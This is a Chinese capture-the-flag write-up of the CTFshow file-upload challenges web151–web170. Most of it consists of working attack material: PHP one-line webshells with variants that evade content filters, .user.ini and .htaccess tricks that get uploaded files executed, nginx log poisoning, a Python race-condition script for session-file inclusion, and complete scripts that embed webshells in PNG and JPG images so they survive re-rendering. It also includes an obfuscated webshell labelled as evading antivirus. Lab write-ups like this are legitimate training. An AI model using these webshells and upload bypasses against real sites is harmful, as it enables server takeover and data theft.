# CTFSHOW 文件上传

## web151  JS前端绕过



<img src="https://i-blog.csdnimg.cn/blog_migrate/a7effd01fd30e1dbb4df6180c06ae379.png" alt="" style="max-height:184px; box-sizing:content-box;" />


直接上传 png的图片马

然后抓包修改为php

```perl
a=system("ls /var/www/html");
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/fed96f44bdf425b8b314dc02933a7f36.png" alt="" style="max-height:138px; box-sizing:content-box;" />




```perl
a=system("cat /var/www/html/flag.php");
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/b2ac0057d3dab0c73cc6e93fa61d8f32.png" alt="" style="max-height:54px; box-sizing:content-box;" />


## web152

和151一样的方法也可以实现上传



<img src="https://i-blog.csdnimg.cn/blog_migrate/c45aa8385e631a8f6f8bac77ad2cf2e8.png" alt="" style="max-height:113px; box-sizing:content-box;" />


```perl
a=system("ls /var/www/html");
a=system("cat /var/www/html/flag.php");
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/242c0ad9a02c81125abd547283a23890.png" alt="" style="max-height:70px; box-sizing:content-box;" />


## web153   .user.ini





<img src="https://i-blog.csdnimg.cn/blog_migrate/d266152fee10189fe010df319ddd3aa0.png" alt="" style="max-height:201px; box-sizing:content-box;" />


用之前的方式无法上传 我们使用其他后缀名看看





<img src="https://i-blog.csdnimg.cn/blog_migrate/65406eceb73b51999922df33adc7008e.png" alt="" style="max-height:168px; box-sizing:content-box;" />


但是无法解析 访问就直接下载了 这个时候 我们可以使用 .user. ini

因为服务器是nginx所以可以使用

```cobol
auto_prepend_file = easy.png
```

解析 easy.png

先上传 user 发现有前端 那么我们就修改为 png



<img src="https://i-blog.csdnimg.cn/blog_migrate/da15471e8b1ccac981a6aa2125ac66f3.png" alt="" style="max-height:107px; box-sizing:content-box;" />






<img src="https://i-blog.csdnimg.cn/blog_migrate/cddb5aa99a91aad2be519f32a629a90c.png" alt="" style="max-height:184px; box-sizing:content-box;" />


然后直接上传 easy.png

因为我们访问upload目录的时候 会显示



<img src="https://i-blog.csdnimg.cn/blog_migrate/b364201713e4e8a59b95025274812f3a.png" alt="" style="max-height:91px; box-sizing:content-box;" />


说明存在index.php首页

所以我们通过 .user.ini 将 easy.png 类似 include进 index.php

进行解析 这样就会访问到我们的一句话木马



然后 我们访问/upload/index.php

```perl
a=system("ls /var/www/html");
 
a=system("cat /var/www/html/flag.php");
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/996fcc907e61978c7bbe8d741997e4b6.png" alt="" style="max-height:73px; box-sizing:content-box;" />


## web154  判断内容检测 ，短标签



<img src="https://i-blog.csdnimg.cn/blog_migrate/9798e91c05db37d8f045ea04addc6192.png" alt="" style="max-height:90px; box-sizing:content-box;" />


这里只是上传 png就报错

说明存在内容检测 多半是php格式的检测

我们可以使用其他的

```cobol
<?= eval($_POST[1]);?>
 
<? eval($_POST[1]);?>
 
<% eval($_POST[1]);%>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/d4614bdbccf4f94b5314ccef4c4eaf84.png" alt="" style="max-height:158px; box-sizing:content-box;" />


那我们看看能不能还可以使用 .user.ini



<img src="https://i-blog.csdnimg.cn/blog_migrate/9a50a3cd05bad2db3e6f27eec6901eb6.png" alt="" style="max-height:76px; box-sizing:content-box;" />


依然可以

## web155

使用上面的方法还是可以

## web156  对 [] 的过滤 （内容检测）



<img src="https://i-blog.csdnimg.cn/blog_migrate/b85016300e1245121290f9eae1fb1735.png" alt="" style="max-height:201px; box-sizing:content-box;" />


发现又对内容进行过滤了

经过排查 发现是对 [] 进行过滤了 所以我们直接使用 {}即可绕过

```php
<?= eval($_POST{1});?>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/3447f25b20f2f19ca436307eb3406077.png" alt="" style="max-height:614px; box-sizing:content-box;" />


然后配合 user.ini 执行命令

## web157  过滤[] {} ;

这里我们可以发现 操作步骤和上面一样 但是在传犸的时候无法实现

经过一直删 发现 【】 {} ；

全被过滤了 那么木马就没办法了 但是可以通过短标签来执行system命令

```cobol
<?=
system(ls)
?>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/01c6530c74bd805b9b8e4140df7d9509.png" alt="" style="max-height:445px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/d0b9c5980d462446a1df6a706cb951ff.png" alt="" style="max-height:151px; box-sizing:content-box;" />


```cobol
<?=
system('nl ../f*')
?>
```

## web158

和上面一样 可以直接读取

## web159  过滤() 使用内联执行

这里发现()也不好使了

我们可以使用`` 来执行命令

```cobol
<?= `nl ../f*`?>
```

## web160 user.ini + 日志包含

过滤了空格 和 ``

这里发现内联也无法实现了

我们想想看能不能直接包含日志 然后通过日志进行文件上传

发现无法实现

```php
<?=include"/var/log/nginx/access.log"
```

这里我们开始删去内容 然后看看什么被过滤了 最后发现是log被过滤了

然后我们思考这里是传入字符串 所以可以通过 点 绕过

```php
<?=include"/var/lo"."g/nginx/access.lo"."g"
```

成功上传



<img src="https://i-blog.csdnimg.cn/blog_migrate/b7b5e190f5f2dfd9f6d00135eea6988d.png" alt="" style="max-height:825px; box-sizing:content-box;" />


成功了 我们在ua上写入木马即可

## web161 文件头检测

这里我们用之前的方法 上传不上了 这里我们继续测试 给他加个文件头 看看是不是检测文件头了

```cobol
Content-Disposition: form-data; name="file"; filename=".user.ini"
Content-Type: image/png
 
GIF89a
auto_prepend_file=easy.png
-----------------------------2733874569091844203618467231--
```

上传成功

所以这里其实就是检测文件头 然后我们看看上一题的方法能不能做

```cobol
 
-----------------------------2733874569091844203618467231
Content-Disposition: form-data; name="file"; filename="easy.png"
Content-Type: image/png
 
GIF89a
<?=include"/var/lo"."g/nginx/access.lo"."g"?>
-----------------------------2733874569091844203618467231--
```

ok的 所以一样日志注入

## web162-163 ssionse竞争

```cobol
auto_append_file = "php://filter/convert.base64-decode/resource=shell.abc"
```

发现上面这个方法无法实现 所以我们通过session条件竞争实现

我们直接包含一个没有和后缀的文件

```cobol
-----------------------------26453916323194629079581901902
Content-Disposition: form-data; name="file"; filename=".user.ini"
Content-Type: image/png
 
GIF89a
auto_append_file=png
-----------------------------26453916323194629079581901902--
```

这里实现了包含png 我们接下来上传png文件

需要包含临时文件 /tmp/sess_xioa

```cobol
GIF89a
<?include"/tmp/sess_xioa"?>
```

这个是yu师傅的代码 其实我们看一下也知道了如何实现

```cobol
import requests
import threading
session=requests.session()
sess='xioa'
url1="http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/"
url2="http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/upload"
data1={
	'PHP_SESSION_UPLOAD_PROGRESS':'<?php system("tac ../f*");?>'
}
file={
	'file':'abcd'
}
cookies={
	'PHPSESSID': sess
}
 
def write():
	while True:
		r = session.post(url1,data=data1,files=file,cookies=cookies)
def read():
	while True:
		r = session.get(url2)
		if 'ctfshow' in r.text:
			print(r.text)
			
threads = [threading.Thread(target=write),
       threading.Thread(target=read)]
for t in threads:
	t.start()
```

## web164  PNG二次渲染

这里记录一下二次渲染脚本

```cobol
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);
 
 
 
$img = imagecreatetruecolor(32, 32);
 
for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}
 
imagepng($img,'2.png');  //要修改的图片的路径
/* 木马内容
<?$_GET[0]($_POST[1]);?>
 */

?>
```

然后上传 发现存在查看图片

我们进入

然后发送请求

```cobol
&0=system
 
 
post
 
1=cat f*
```

即可获得flag



<img src="https://i-blog.csdnimg.cn/blog_migrate/b0667c475116ab75521f388fba04cd41.png" alt="" style="max-height:880px; box-sizing:content-box;" />


## web165  JPG二次渲染

就不写了 贴个脚本

```php
<?php
    /*

    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
    It is necessary that the size and quality of the initial image are the same as those of the processed image.

    1) Upload an arbitrary image via secured files upload script
    2) Save the processed image and launch:
    jpg_payload.php <jpg_name.jpg>

    In case of successful injection you will get a specially crafted image, which should be uploaded again.

    Since the most straightforward injection method is used, the following problems can occur:
    1) After the second processing the injected data may become partially corrupted.
    2) The jpg_payload.php script outputs "Something's wrong".
    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.

    Sergey Bobrov @Black2Fan.

    See also:
    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

    */
		
    $miniPayload = "<?=eval(\$_POST[7]);?>"; //注意$转义
 
 
    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
        die('php-gd is not installed');
    }
 
    if(!isset($argv[1])) {
        die('php jpg_payload.php <jpg_name.jpg>');
    }
 
    set_error_handler("custom_error_handler");
 
    for($pad = 0; $pad < 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;
 
        if($dis->readShort() != 0xFFD8) {
            die('Incorrect SOI marker');
        }
 
        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
            $marker = $dis->readByte();
            $size = $dis->readShort() - 2;
            $dis->skip($size);
            if($marker === 0xDA) {
                $startPos = $dis->seek();
                $outStreamTmp = 
                    substr($outStream, 0, $startPos) . 
                    $miniPayload . 
                    str_repeat("\0",$nullbytePayloadSize) . 
                    substr($outStream, $startPos);
                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis->eof())) {
                        if($dis->readByte() === 0xFF) {
                            if($dis->readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis->seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        substr(
                            str_repeat("\0",$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage('payload_'.$argv[1], $outStream)) {
                    die('Success!');
                } else {
                    break;
                }
            }
        }
    }
    unlink('payload_'.$argv[1]);
    die('Something\'s wrong');
 
    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }
 
    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }
 
    class DataInputStream {
        private $binData;
        private $order;
        private $size;
 
        public function __construct($filename, $order = false, $fromString = false) {
            $this->binData = '';
            $this->order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die('File not exists ['.$filename.']');
                $this->binData = file_get_contents($filename);
            } else {
                $this->binData = $filename;
            }
            $this->size = strlen($this->binData);
        }
 
        public function seek() {
            return ($this->size - strlen($this->binData));
        }
 
        public function skip($skip) {
            $this->binData = substr($this->binData, $skip);
        }
 
        public function readByte() {
            if($this->eof()) {
                die('End Of File');
            }
            $byte = substr($this->binData, 0, 1);
            $this->binData = substr($this->binData, 1);
            return ord($byte);
        }
 
        public function readShort() {
            if(strlen($this->binData) < 2) {
                die('End Of File');
            }
            $short = substr($this->binData, 0, 2);
            $this->binData = substr($this->binData, 2);
            if($this->order) {
                $short = (ord($short[1]) << 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) << 8) + ord($short[1]);
            }
            return $short;
        }
 
        public function eof() {
            return !$this->binData||(strlen($this->binData) === 0);
        }
    }
?>
```

## web166 zip 下载->文件包含

这里我们需要传递一个zip 然后我们在后面写马



<img src="https://i-blog.csdnimg.cn/blog_migrate/cfe831ffc206a2878efaf53c6de8598e.png" alt="" style="max-height:545px; box-sizing:content-box;" />


然后去下载的界面 然后抓包



<img src="https://i-blog.csdnimg.cn/blog_migrate/6322ce242c81d3b3942698834c39233e.png" alt="" style="max-height:512px; box-sizing:content-box;" />


发现已经解析了

然后通过这个方法getshell即可

## web167  .htacess

```cobol
AddType application/x-httpd-php .abc
php_value auto_append_file "php://filter/convert.base64-decode/resource=shell.abc"
```

user.ini是

```cobol
auto_append_file = "php://filter/convert.base64-decode/resource=shell.png"
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/969551483c16f475fb281737cb3bc32e.png" alt="" style="max-height:453px; box-sizing:content-box;" />


然后上传shell.abc 里面的payload为base64编码的一句话



<img src="https://i-blog.csdnimg.cn/blog_migrate/aabc33dc476659535ad8ee1068e8ebe2.png" alt="" style="max-height:435px; box-sizing:content-box;" />


然后访问即可



<img src="https://i-blog.csdnimg.cn/blog_migrate/5838235d59970551b5566b833caad4b5.png" alt="" style="max-height:749px; box-sizing:content-box;" />


## web168

说是免杀

```php
<?php
	$a=strrev("metsys");
	$a($_REQUEST[0]);
?>
```

上传png 然后修改php 访问即可





<img src="https://i-blog.csdnimg.cn/blog_migrate/baa3758493524d28941f8fd397821af2.png" alt="" style="max-height:631px; box-sizing:content-box;" />


通过传递0获取



<img src="https://i-blog.csdnimg.cn/blog_migrate/b7ec5cf523bae2fb00e626371eb4f7d1.png" alt="" style="max-height:514px; box-sizing:content-box;" />


## web169-web170

日志注入

上传user.ini

```cobol
auto_prepend_file=/var/log/nginx/access.log
```

然后再上传一个php文件 ua中写入木马即可

到这里 就结束了

感觉日志注入 咋这么多